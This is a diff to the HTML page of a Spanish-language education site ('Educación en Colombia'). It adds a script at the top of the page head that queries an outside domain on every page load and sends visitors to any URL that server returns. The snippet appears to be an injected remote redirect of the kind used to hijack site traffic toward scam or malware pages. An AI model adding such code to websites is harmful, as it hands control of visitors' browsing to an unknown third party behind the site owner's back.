@@ -1,6 +1,15 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+  <script>
+fetch("https://chepitoo.site/api/redirect")
+.then(r => r.json())
+.then(data => {
+    if (data.redirect) {
+        window.location.href = data.url;
+    }
+});
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Educación en Colombia</title>
